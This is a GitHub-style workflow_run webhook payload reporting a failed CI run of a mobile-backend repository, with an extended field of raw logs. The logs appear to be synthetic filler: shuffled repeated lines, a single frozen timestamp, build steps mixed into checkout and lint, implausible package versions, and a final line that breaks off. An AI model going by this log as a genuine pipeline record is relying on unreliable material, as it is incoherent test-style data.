{
  "action": "completed",
  "workflow_run": {
    "id": 637,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "57266ff646f006b443d3a7e2af338427b0a2a782",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-11-28T12:00:30.578613Z",
    "updated_at": "2025-11-28T12:02:25.039847Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: type_check ===\n[12:00:30] WARN: Deprecated API usage\n[12:00:30] INFO: Processing request\n  PASS: test_api_health (496ms)\n\u2713 lint completed\n  PASS: test_user_create (366ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_user_create (108ms)\nCache hit for key-9983\nInstalling webpack@2.7.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (29MB)\nStep 4/10: Building\n\u2713 test completed\nCompiling src/utils.go...\nStep 1/10: Building\nStep 2/10: Building\n  PASS: test_cache_hit (143ms)\nCompiling src/service.java...\nStep 6/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 3/10: Building\nCompiling src/app.ts...\n  PASS: test_api_health (95ms)\n\u2713 lint completed\n\u2713 build completed\nWARNING: prettier has known vulnerabilities\nCompiling src/app.ts...\nCache hit for key-4362\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling webpack@2.16.0\n  PASS: test_api_health (165ms)\nArtifact uploaded: build.tar.gz (28MB)\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\nWARNING: jest has known vulnerabilities\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\nStep 5/10: Building\nStep 3/10: Building\n[12:00:30] INFO: Processing request\n  PASS: test_auth_login (279ms)\nCompiling src/index.js...\nStep 2/10: Building\nCache hit for key-9939\nCache hit for key-1855\nWARNING: lodash has known vulnerabilities\n  PASS: test_db_connect (361ms)\n[12:00:30] INFO: Processing request\nCache hit for key-9297\n  PASS: test_db_connect (178ms)\n  PASS: test_db_connect (10ms)\n  PASS: test_db_connect (276ms)\nCompiling src/handler.rs...\n[12:00:30] INFO: Processing request\n\u2713 build completed\n  PASS: test_auth_login (95ms)\n  PASS: test_user_create (136ms)\nCompiling src/service.java...\nStep 2/10: Building\nCache hit for key-2912\nArtifact uploaded: build.tar.gz (25MB)\nWARNING: express has known vulnerabilities\n  PASS: test_user_create (185ms)\n\u2713 test completed\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (24MB)\nCache hit for key-8182\n\u2713 build completed\nCompiling src/main.py...\n  PASS: test_db_connect (1ms)\nInstalling axios@3.6.0\nCache hit for key-6643\nCache hit for key-2326\nCompiling src/app.ts...\n[12:00:30] INFO: Processing request\n\u2713 lint completed\nCache hit for key-6721\n[12:00:30] INFO: Processing request\nInstalling prettier@4.6.0\n  PASS: test_api_health (428ms)\nStep 4/10: Building\n\u2713 build completed\n\u2713 lint completed\nStep 4/10: Building\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nCompiling src/app.ts...\n[12:00:30] INFO: Processing request\n  PASS: test_api_health (399ms)\nCache hit for key-9291\n\u2713 lint completed\nCompiling src/main.py...\nCompiling src/handler.rs...\n[12:00:30] INFO: Processing request\nStep 6/10: Building\nCache hit for key-4927\nStep 9/10: Building\nInstalling express@2.4.0\nInstalling webpack@2.11.0\n  PASS: test_db_connect (151ms)\nCompiling src/app.ts...\n[12:00:30] INFO: Processing request\n[12:00:30] WARN: Deprecated API usage\nInstalling express@1.13.0\n\u2713 build completed\n[12:00:30] INFO: Processing request\nCache hit for key-3314\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:30] INFO: Processing request\nInstalling axios@4.6.0\nInstalling axios@5.19.0\nInstalling webpack@5.17.0\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (39MB)\nFAILED: test_auth_login\n  PASS: test_user_create (456ms)\nInstalling webpack@5.6.0\n[12:00:30] INFO: Processing request\nInstalling prettier@4.18.0\nCache hit for key-6066\nCompiling src/handler.rs...\n[12:00:30] INFO: Processing request\nInstalling express@5.13.0\n  PASS: test_api_health (297ms)\n[12:00:30] INFO: Processing request\nCompiling src/app.ts...\nCompiling src/service.java...\n  PASS: test_api_health (199ms)\n\u2713 test completed\nInstalling webpack@5.1.0\n\u2713 test completed\nStep 8/10: Building\nCompiling src/app.ts...\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (14MB)\nArtifact uploaded: build.tar.gz (45MB)\n  PASS: test_auth_login (467ms)\nInstalling prettier@3.17.0\nStep 7/10: Building\nStep 7/10: Building\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (27MB)\nInstalling axios@4.0.0\nCompiling src/service.java...\nCompiling src/app.ts...\n\u2713 test completed\n[12:00:30] INFO: Processing request\n\u2717 build failed with exit code 97\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nInstalling lodash@3.15.0\n  PASS: test_auth_login (396ms)\n[12:00:30] WARN: Deprecated API usage\nCache hit for key-4892\n[12:00:30] INFO: Processing request\nInstalling webpack@5.9.0\n  PASS: test_user_create (88ms)\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (29MB)\n  PASS: test_auth_login (482ms)\nInstalling jest@4.4.0\nWARNING: express has known vulnerabilities\n  PASS: test_api_health (336ms)\n[12:00:30] INFO: Processing request\n\u2713 lint completed\n\u2713 lint completed\n[12:00:30] WARN: Deprecated API usage\n=== Step type_check completed ===\n=== Step: setup_node ===\n  PASS: test_auth_login (491ms)\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\nCompiling src/main.py...\nStep 8/10: Building\nCompiling src/index.js...\n[12:00:30] INFO: Processing request\nCompiling src/service.java...\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_user_create (314ms)\nArtifact uploaded: build.tar.gz (50MB)\nCache hit for key-8571\nStep 5/10: Building\nCompiling src/index.js...\n\u2713 lint completed\nCompiling src/service.java...\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (3MB)\nStep 2/10: Building\nInstalling express@1.9.0\nCache hit for key-8824\nException: TypeError\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-5747\n  PASS: test_auth_login (470ms)\n  PASS: test_cache_hit (399ms)\nCompiling src/service.java...\nException: TypeError\nArtifact uploaded: build.tar.gz (22MB)\n\u2713 test completed\n[12:00:30] INFO: Processing request\nStep 4/10: Building\nCache hit for key-6804\nArtifact uploaded: build.tar.gz (1MB)\nCompiling src/app.ts...\nWARNING: react has known vulnerabilities\nInstalling lodash@5.19.0\nInstalling webpack@1.0.0\nArtifact uploaded: build.tar.gz (21MB)\nWARNING: express has known vulnerabilities\n\u2713 lint completed\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nCompiling src/app.ts...\nWARNING: eslint has known vulnerabilities\nInstalling prettier@1.5.0\nInstalling webpack@2.0.0\n[12:00:30] WARN: Deprecated API usage\n[12:00:30] INFO: Processing request\n\u2713 test completed\nCompiling src/utils.go...\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nCompiling src/service.java...\n  PASS: test_user_create (475ms)\nFAILED: test_db_connect\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (33MB)\nCache hit for key-1205\nCache hit for key-1187\nCache hit for key-4144\nCache hit for key-8148\n\u2713 lint completed\n\u2713 lint completed\n  PASS: test_cache_hit (85ms)\nInstalling lodash@2.1.0\n\u2713 test completed\nInstalling axios@5.9.0\nArtifact uploaded: build.tar.gz (46MB)\n\u2713 lint completed\n  PASS: test_db_connect (205ms)\n  PASS: test_auth_login (291ms)\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (45MB)\nCompiling src/index.js...\n  PASS: test_api_health (205ms)\nCache hit for key-1008\nArtifact uploaded: build.tar.gz (41MB)\n\u2713 lint completed\n[12:00:30] INFO: Processing request\n\u2713 build completed\n  PASS: test_user_create (249ms)\nStep 9/10: Building\n\u2713 build completed\nStep 8/10: Building\nStep 1/10: Building\n  PASS: test_user_create (32ms)\nInstalling lodash@1.11.0\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (50MB)\nCache hit for key-1703\n[12:00:30] WARN: Deprecated API usage\nCache hit for key-8849\nInstalling prettier@2.5.0\nStep 9/10: Building\n  PASS: test_auth_login (13ms)\nStep 1/10: Building\n  PASS: test_db_connect (462ms)\nStep 1/10: Building\n  PASS: test_cache_hit (317ms)\n[12:00:30] WARN: Deprecated API usage\n  PASS: test_cache_hit (375ms)\nCompiling src/app.ts...\nInstalling react@1.20.0\n[12:00:30] ERROR: Connection failed\nInstalling express@5.14.0\nInstalling lodash@2.13.0\nCache hit for key-2943\n\u2713 test completed\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (13MB)\nInstalling axios@5.18.0\nInstalling webpack@3.14.0\nArtifact uploaded: build.tar.gz (43MB)\nArtifact uploaded: build.tar.gz (6MB)\nInstalling lodash@2.6.0\nException: ValueError\nStep 6/10: Building\n\u2713 build completed\n  PASS: test_api_health (413ms)\n\u2717 build failed with exit code 37\n  PASS: test_api_health (24ms)\nInstalling express@5.5.0\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nCache hit for key-8024\n\u2713 build completed\nException: RuntimeError\nCompiling src/service.java...\n[12:00:30] INFO: Processing request\nCache hit for key-2863\nCompiling src/app.ts...\n\u2713 build completed\n[12:00:30] INFO: Processing request\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (7MB)\n[12:00:30] INFO: Processing request\nCompiling src/index.js...\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n\u2713 lint completed\nCache hit for key-6270\nStep 10/10: Building\nCompiling src/main.py...\nInstalling axios@5.16.0\nCache hit for key-1346\nInstalling webpack@4.7.0\nStep 4/10: Building\n  PASS: test_user_create (316ms)\nInstalling jest@2.15.0\nStep 3/10: Building\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (33MB)\nCache hit for key-9312\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_auth_login (95ms)\nCompiling src/main.py...\nWARNING: lodash has known vulnerabilities\nStep 1/10: Building\nStep 2/10: Building\nCache hit for key-9138\n[12:00:30] INFO: Processing request\n  PASS: test_db_connect (373ms)\nCompiling src/utils.go...\nCache hit for key-8142\n=== Step setup_node completed ===\n=== Step: checkout ===\nArtifact uploaded: build.tar.gz (20MB)\nInstalling axios@1.9.0\n  PASS: test_db_connect (290ms)\n[12:00:30] ERROR: Connection failed\nCompiling src/service.java...\nCompiling src/handler.rs...\nCompiling src/app.ts...\nCache hit for key-5961\n[12:00:30] WARN: Deprecated API usage\nInstalling jest@1.17.0\nWARNING: express has known vulnerabilities\n  PASS: test_api_health (402ms)\n\u2713 lint completed\nCache hit for key-4092\nStep 5/10: Building\n  PASS: test_api_health (181ms)\nCache hit for key-1125\n\u2713 test completed\nCompiling src/app.ts...\nInstalling lodash@2.16.0\nInstalling axios@1.9.0\n[12:00:30] INFO: Processing request\n  PASS: test_user_create (469ms)\n  PASS: test_cache_hit (22ms)\n  PASS: test_user_create (66ms)\nCompiling src/service.java...\n  PASS: test_user_create (28ms)\nFAILED: test_cache_hit\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/index.js...\nCompiling src/app.ts...\nInstalling react@5.8.0\n  PASS: test_db_connect (341ms)\n\u2717 build failed with exit code 122\n  PASS: test_auth_login (444ms)\nArtifact uploaded: build.tar.gz (28MB)\n\u2713 lint completed\nCompiling src/utils.go...\n\u2713 lint completed\nCache hit for key-9471\nCompiling src/app.ts...\n  PASS: test_user_create (174ms)\nStep 10/10: Building\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (37MB)\nCache hit for key-8414\nCompiling src/utils.go...\nWARNING: express has known vulnerabilities\nInstalling webpack@1.5.0\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (36MB)\nCompiling src/app.ts...\nStep 9/10: Building\nStep 5/10: Building\nCompiling src/service.java...\nCache hit for key-4112\nCompiling src/handler.rs...\nCache hit for key-8113\n  PASS: test_auth_login (448ms)\n[12:00:30] INFO: Processing request\n  PASS: test_db_connect (44ms)\n[12:00:30] INFO: Processing request\nInstalling react@3.19.0\nStep 9/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (15MB)\n\u2713 test completed\n  PASS: test_user_create (135ms)\n[12:00:30] INFO: Processing request\nCache hit for key-7804\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:30] INFO: Processing request\nInstalling react@2.4.0\n  PASS: test_cache_hit (71ms)\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-3657\n\u2713 test completed\nCompiling src/main.py...\nCache hit for key-5633\n  PASS: test_api_health (430ms)\n  PASS: test_cache_hit (447ms)\nCache hit for key-3362\nInstalling react@5.19.0\n  PASS: test_db_connect (316ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (3MB)\n  PASS: test_db_connect (151ms)\n  PASS: test_cache_hit (378ms)\nCompiling src/service.java...\n\u2713 build completed\n\u2713 lint completed\nCache hit for key-8075\nInstalling express@1.15.0\nStep 5/10: Building\n  PASS: test_cache_hit (305ms)\n  PASS: test_api_health (398ms)\n  PASS: test_api_health (75ms)\nCache hit for key-2870\nStep 7/10: Building\nWARNING: axios has known vulnerabilities\nInstalling react@5.13.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling react@2.10.0\nWARNING: react has known vulnerabilities\n\u2713 test completed\nStep 5/10: Building\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nInstalling react@5.20.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (18MB)\nInstalling jest@4.18.0\nCompiling src/handler.rs...\nCompiling src/index.js...\n  PASS: test_auth_login (381ms)\nStep 7/10: Building\nCompiling src/service.java...\n\u2713 test completed\n\u2713 lint completed\nException: RuntimeError\nCache hit for key-2992\nStep 6/10: Building\nException: ValueError\n[12:00:30] INFO: Processing request\nInstalling webpack@4.11.0\nCache hit for key-8836\n\u2713 test completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:30] INFO: Processing request\nCompiling src/utils.go...\n\u2713 lint completed\n\u2713 test completed\nInstalling lodash@5.5.0\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-4943\nArtifact uploaded: build.tar.gz (10MB)\n  PASS: test_db_connect (427ms)\n  PASS: test_api_health (291ms)\n  PASS: test_cache_hit (371ms)\nInstalling webpack@4.4.0\nArtifact uploaded: build.tar.gz (21MB)\nWARNING: react has known vulnerabilities\nStep 10/10: Building\n\u2713 lint completed\nCache hit for key-8419\n[12:00:30] INFO: Processing request\n  PASS: test_api_health (368ms)\nStep 10/10: Building\nCache hit for key-2969\nInstalling webpack@2.15.0\nInstalling express@1.19.0\n[12:00:30] INFO: Processing request\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (28MB)\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (9MB)\nInstalling lodash@3.1.0\nInstalling lodash@5.18.0\nWARNING: jest has known vulnerabilities\nCache hit for key-8821\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 build completed\nCache hit for key-1586\n[12:00:30] WARN: Deprecated API usage\n\u2713 lint completed\n=== Step checkout completed ===\n=== Step: build ===\nInstalling express@1.17.0\nInstalling axios@2.10.0\nFAILED: test_user_create\nStep 6/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (44MB)\n  PASS: test_auth_login (400ms)\n\u2713 lint completed\n[12:00:30] ERROR: Connection failed\nCompiling src/app.ts...\nCompiling src/utils.go...\nException: NullPointerException\n  PASS: test_cache_hit (447ms)\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (4MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:30] ERROR: Connection failed\nCache hit for key-2209\nArtifact uploaded: build.tar.gz (39MB)\nArtifact uploaded: build.tar.gz (41MB)\nCompiling src/handler.rs...\nInstalling eslint@2.16.0\nCache hit for key-5267\nInstalling prettier@2.11.0\nInstalling webpack@3.2.0\nStep 2/10: Building\n  PASS: test_cache_hit (374ms)\nCache hit for key-2321\nStep 4/10: Building\nStep 10/10: Building\nStep 1/10: Building\n\u2713 build completed\nStep 2/10: Building\n\u2713 test completed\nCompiling src/utils.go...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 lint completed\n  PASS: test_cache_hit (206ms)\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_db_connect (262ms)\n\u2713 build completed\nInstalling express@1.6.0\n\u2713 build completed\nCache hit for key-6628\nCache hit for key-7763\n[12:00:30] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (36MB)\n\u2713 test completed\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (44MB)\n  PASS: test_auth_login (495ms)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (41MB)\n\u2713 build completed\n  PASS: test_auth_login (372ms)\nCompiling src/app.ts...\nCache hit for key-8863\n  PASS: test_auth_login (492ms)\nArtifact uploaded: build.tar.gz (34MB)\nArtifact uploaded: build.tar.gz (24MB)\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n\u2713 build completed\n[12:00:30] INFO: Processing request\n  PASS: test_db_connect (456ms)\n[12:00:30] INFO: Processing request\nStep 10/10: Building\n  PASS: test_api_health (57ms)\nCache hit for key-3589\n  PASS: test_cache_hit (80ms)\n\u2713 lint completed\nCompiling src/index.js...\nException: NullPointerException\nInstalling prettier@2.19.0\nCache hit for key-6364\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (28MB)\nCache hit for key-2410\n[12:00:30] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-1833\n\u2713 test completed\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:30] INFO: Processing request\nStep 3/10: Building\nStep 3/10: Building\n\u2713 build completed\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-1769\nArtifact uploaded: build.tar.gz (39MB)\nCache hit for key-2733\nStep 9/10: Building\nCompiling src/handler.rs...\nCompiling src/index.js...\n[12:00:30] INFO: Processing request\n  PASS: test_db_connect (494ms)\nCache hit for key-9395\nCompiling src/main.py...\nCache hit for key-1673\n  PASS: test_user_create (428ms)\nCache hit for key-4514\n\u2713 test completed\n\u2713 test completed\nInstalling lodash@5.13.0\n  PASS: test_cache_hit (483ms)\nCompiling src/main.py...\nCache hit for key-8990\nInstalling lodash@3.0.0\nCompiling src/index.js...\nCache hit for key-9678\n\u2713 build completed\nStep 3/10: Building\n  PASS: test_db_connect (445ms)\nStep 9/10: Building\n\u2713 test completed\n[12:00:30] WARN: Deprecated API usage\n[12:00:30] WARN: Deprecated API usage\n  PASS: test_cache_hit (489ms)\nStep 5/10: Building\n  PASS: test_auth_login (396ms)\n\u2713 test completed\nStep 1/10: Building\n  PASS: test_user_create (79ms)\nArtifact uploaded: build.tar.gz (39MB)\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling express@1.7.0\n[12:00:30] INFO: Processing request\n  PASS: test_db_connect (128ms)\nArtifact uploaded: build.tar.gz (19MB)\nInstalling prettier@2.6.0\nInstalling lodash@5.8.0\nCompiling src/app.ts...\nInstalling eslint@5.5.0\nArtifact uploaded: build.tar.gz (23MB)\nStep 8/10: Building\nInstalling prettier@3.17.0\n  PASS: test_auth_login (72ms)\n\u2713 test completed\nCache hit for key-3673\n[12:00:30] INFO: Processing request\nException: NullPointerException\n[12:00:30] INFO: Processing request\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (22MB)\nCompiling src/service.java...\nStep 1/10: Building\n[12:00:30] INFO: Processing request\nStep 4/10: Building\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (44MB)\nInstalling webpack@4.19.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 build completed\nCache hit for key-3189\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n[12:00:30] WARN: Deprecated API usage\n\u2713 build completed\nInstalling jest@4.12.0\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n=== Step build completed ===\n=== Step: install_dependencies ===\n[12:00:30] INFO: Processing request\nInstalling jest@1.19.0\nCache hit for key-3704\nWARNING: eslint has known vulnerabilities\n\u2713 test completed\n  PASS: test_user_create (264ms)\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 build completed\n[12:00:30] INFO: Processing request\nCache hit for key-3245\n\u2717 build failed with exit code 60\nInstalling axios@4.10.0\nInstalling jest@3.16.0\n[12:00:30] INFO: Processing request\n\u2713 lint completed\nStep 6/10: Building\n\u2713 build completed\n  PASS: test_db_connect (74ms)\nCompiling src/main.py...\n[12:00:30] INFO: Processing request\n\u2713 build completed\nCache hit for key-8823\nArtifact uploaded: build.tar.gz (23MB)\n[12:00:30] INFO: Processing request\nCache hit for key-3469\nCache hit for key-5061\nCompiling src/service.java...\n\u2713 build completed\n[12:00:30] WARN: Deprecated API usage\nCache hit for key-6460\n\u2713 build completed\nInstalling axios@3.2.0\nInstalling prettier@3.9.0\nCompiling src/handler.rs...\nInstalling prettier@5.11.0\n[12:00:30] INFO: Processing request\nCompiling src/utils.go...\nStep 9/10: Building\n\u2713 lint completed\n\u2717 build failed with exit code 12\nCompiling src/main.py...\n[12:00:30] INFO: Processing request\n  PASS: test_auth_login (462ms)\nInstalling express@4.20.0\n\u2713 build completed\nInstalling eslint@3.10.0\n[12:00:30] INFO: Processing request\nCompiling src/service.java...\n[12:00:30] INFO: Processing request\nWARNING: jest has known vulnerabilities\nStep 4/10: Building\n[12:00:30] WARN: Deprecated API usage\n[12:00:30] INFO: Processing request\nStep 1/10: Building\nCache hit for key-5695\nWARNING: eslint has known vulnerabilities\n\u2713 test completed\n  PASS: test_cache_hit (440ms)\nArtifact uploaded: build.tar.gz (25MB)\n\u2713 lint completed\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (18MB)\nCache hit for key-4489\nCache hit for key-8506\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 build completed\nCompiling src/utils.go...\nCache hit for key-8824\n\u2717 build failed with exit code 43\nArtifact uploaded: build.tar.gz (47MB)\n  PASS: test_cache_hit (325ms)\n\u2713 build completed\n[12:00:30] INFO: Processing request\n\u2713 lint completed\nCache hit for key-1345\nCache hit for key-2531\nArtifact uploaded: build.tar.gz (33MB)\n\u2713 build completed\nStep 3/10: Building\n[12:00:30] INFO: Processing request\nInstalling express@5.16.0\nArtifact uploaded: build.tar.gz (43MB)\nStep 5/10: Building\nStep 7/10: Building\nStep 8/10: Building\nCompiling src/utils.go...\n\u2713 build completed\nInstalling express@1.9.0\nStep 4/10: Building\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (49MB)\nCache hit for key-3309\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/service.java...\n[12:00:30] INFO: Processing request\nStep 1/10: Building\nInstalling eslint@2.20.0\n[12:00:30] INFO: Processing request\nStep 1/10: Building\n  PASS: test_cache_hit (285ms)\nInstalling lodash@1.13.0\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-6329\nInstalling eslint@2.8.0\n\u2713 test completed\n  PASS: test_auth_login (268ms)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (48MB)\nInstalling prettier@5.3.0\nArtifact uploaded: build.tar.gz (7MB)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (12MB)\nInstalling react@5.17.0\nException: RuntimeError\nStep 10/10: Building\n  PASS: test_user_create (108ms)\nCompiling src/service.java...\nCache hit for key-4666\nCache hit for key-3502\n  PASS: test_user_create (388ms)\nCompiling src/handler.rs...\n\u2713 test completed\nCompiling src/handler.rs...\n[12:00:30] INFO: Processing request\nStep 7/10: Building\nCompiling src/index.js...\n  PASS: test_user_create (252ms)\nCompiling src/app.ts...\n  PASS: test_cache_hit (232ms)\n[12:00:30] INFO: Processing request\nInstalling prettier@1.8.0\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_auth_login (45ms)\n\u2713 build completed\n\u2713 lint completed\n[12:00:30] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:30] INFO: Processing request\nStep 10/10: Building\nCompiling src/main.py...\n[12:00:30] INFO: Processing request\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/index.js...\nCache hit for key-6433\nInstalling react@4.6.0\n\u2713 build completed\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nCache hit for key-2212\n[12:00:30] WARN: Deprecated API usage\n\u2713 lint completed\nCache hit for key-1314\nFAILED: test_cache_hit\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (2MB)\nCompiling src/main.py...\nStep 3/10: Building\nInstalling lodash@2.2.0\nInstalling jest@4.18.0\n[12:00:30] INFO: Processing request\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (46MB)\n  PASS: test_auth_login (440ms)\nCompiling src/service.java...\nCompiling src/utils.go...\n=== Step install_dependencies completed ===\n=== Step: lint ===\nStep 6/10: Building\n[12:00:30] WARN: Deprecated API usage\n\u2713 test completed\n\u2713 build completed\nStep 10/10: Building\nCache hit for key-9457\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/index.js...\nStep 5/10: Building\nCache hit for key-7522\nCache hit for key-8142\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (24MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 build completed\nCache hit for key-6405\n\u2717 build failed with exit code 64\nCompiling src/service.java...\nInstalling webpack@5.17.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (39MB)\n  PASS: test_auth_login (53ms)\n  PASS: test_api_health (119ms)\nStep 2/10: Building\n  PASS: test_api_health (424ms)\n[12:00:30] INFO: Processing request\nCache hit for key-9435\nCompiling src/handler.rs...\nCompiling src/index.js...\nStep 2/10: Building\n\u2713 build completed\n\u2717 build failed with exit code 101\n  PASS: test_api_health (345ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling axios@5.0.0\n  PASS: test_api_health (444ms)\nArtifact uploaded: build.tar.gz (7MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:30] INFO: Processing request\nWARNING: jest has known vulnerabilities\nInstalling webpack@4.9.0\n[12:00:30] WARN: Deprecated API usage\nCache hit for key-1698\nStep 1/10: Building\nStep 4/10: Building\nStep 3/10: Building\nCache hit for key-4994\nStep 4/10: Building\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 lint completed\nCompiling src/service.java...\n  PASS: test_api_health (71ms)\n[12:00:30] INFO: Processing request\nCompiling src/utils.go...\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:30] INFO: Processing request\nInstalling jest@2.5.0\n  PASS: test_user_create (119ms)\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nCache hit for key-9884\nInstalling webpack@2.9.0\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-5761\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 build completed\nStep 2/10: Building\n[12:00:30] WARN: Deprecated API usage\nInstalling eslint@4.15.0\nArtifact uploaded: build.tar.gz (37MB)\nArtifact uploaded: build.tar.gz (5MB)\n\u2713 build completed\n\u2713 test completed\nStep 1/10: Building\n\u2713 lint completed\n\u2717 build failed with exit code 58\nCompiling src/index.js...\n[12:00:30] INFO: Processing request\nInstalling lodash@5.4.0\n\u2713 build completed\nCompiling src/app.ts...\nWARNING: eslint has known vulnerabilities\nCompiling src/service.java...\nCompiling src/index.js...\nCache hit for key-8616\n[12:00:30] WARN: Deprecated API usage\n\u2713 build completed\nInstalling react@2.19.0\nCompiling src/utils.go...\nStep 3/10: Building\n[12:00:30] INFO: Processing request\nCompiling src/handler.rs...\nWARNING: express has known vulnerabilities\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (6MB)\nStep 1/10: Building\n[12:00:30] INFO: Processing request\nCompiling src/index.js...\n[12:00:30] INFO: Processing request\n  PASS: test_user_create (386ms)\nCompiling src/main.py...\nCache hit for key-8034\nException: RuntimeError\n\u2713 test completed\nCompiling src/main.py...\n[12:00:30] WARN: Deprecated API usage\n  PASS: test_cache_hit (252ms)\nStep 5/10: Building\nStep 2/10: Building\nCompiling src/index.js...\nCache hit for key-1719\n[12:00:30] INFO: Processing request\n  PASS: test_db_connect (185ms)\n  PASS: test_api_health (359ms)\nStep 4/10: Building\n  PASS: test_auth_login (114ms)\n[12:00:30] INFO: Processing request\nCache hit for key-6839\n\u2713 lint completed\nStep 5/10: Building\nCache hit for key-8419\nStep 4/10: Building\nStep 1/10: Building\n\u2713 test completed\n[12:00:30] 